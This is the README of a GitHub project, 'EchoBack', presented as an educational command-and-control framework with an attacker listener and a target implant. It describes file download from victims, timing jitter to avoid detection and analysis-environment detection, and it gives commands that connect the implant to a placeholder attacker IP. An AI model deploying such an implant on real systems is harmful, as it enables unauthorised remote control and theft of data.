# EchoBack

A purely educational implementation of a Command and Control (C2) framework to demonstrate cybersecurity concepts in controlled environments.

## ⚠️ IMPORTANT NOTICE

**This project is strictly for EDUCATIONAL PURPOSES ONLY and should ONLY be used in controlled environments such as:**
- Cybersecurity courses and labs
- Educational workshops and training
- Security research in isolated environments

**DO NOT use this code on systems or networks without explicit permission. Unauthorized use may violate computer crime laws.**

## Overview

This project provides a simplified implementation of C2 (Command and Control) infrastructure to help cybersecurity students and educators understand:

- Network communication patterns used by malware
- Data encoding and obfuscation techniques
- Anti-analysis methods and their detection
- Defensive measures against C2 traffic

## Features

### Attacker Component (`attacker.py`)
- Interactive command shell for educational demonstrations
- Message encoding with session tracking
- Command history and logging capabilities
- File download functionality
- Configurable communication parameters (jitter, heartbeats)

### Target Component (`target.py`)
- Educational demonstration of C2 client behaviors
- System information gathering techniques
- Network resilience with exponential backoff
- Command execution and response encoding
- Analysis environment detection demonstration

## Installation

1. Clone the repository:
```bash
git clone https://github.com/arnavgupta-py/EchoBack
cd EchoBack
```

2. Install dependencies:
```bash
pip install -r requirements.txt
```

## Usage

### For Educational Demonstrations

#### Running the Attacker:
```bash
python attacker.py --ip 0.0.0.0 --port 4444
```

#### Running the Target (on a separate system):
```bash
python target.py --server <attacker-ip> --port 4444 
```

### Available Commands

Once connected, you can use the following commands:
- `help` - Display available commands
- `info` - Show target system information
- `download <path>` - Download files from target
- `sleep <seconds>` - Adjust sleep time between commands
- `jitter <percentage>` - Set timing jitter to avoid detection
- `encoding <on|off>` - Toggle command encoding
- `session` - Display current session information
- `exit` - Close the connection and exit

## Building Executables

For educational demonstrations, you may want to build standalone executables. See the [Building Instructions](building_instructions.md) for details.

## Educational Resources

For those using this project in educational settings, consider exploring:
- [MITRE ATT&CK Framework](https://attack.mitre.org/) - Particularly the Command and Control tactics
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [SANS Courses on Malware Analysis](https://www.sans.org/)

## Contributing

Contributions to improve the educational value of this project are welcome. Please ensure all contributions maintain the strictly educational nature of this repository.

1. Fork the repository
2. Create your feature branch: `git checkout -b feature/new-educational-feature`
3. Commit your changes: `git commit -am 'Add educational feature'`
4. Push to the branch: `git push origin feature/new-educational-feature`
5. Submit a pull request

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Disclaimer

This code is provided for educational purposes only. The authors are not responsible for any misuse or damage caused by this code. Users are responsible for complying with all applicable laws and regulations when using this code.
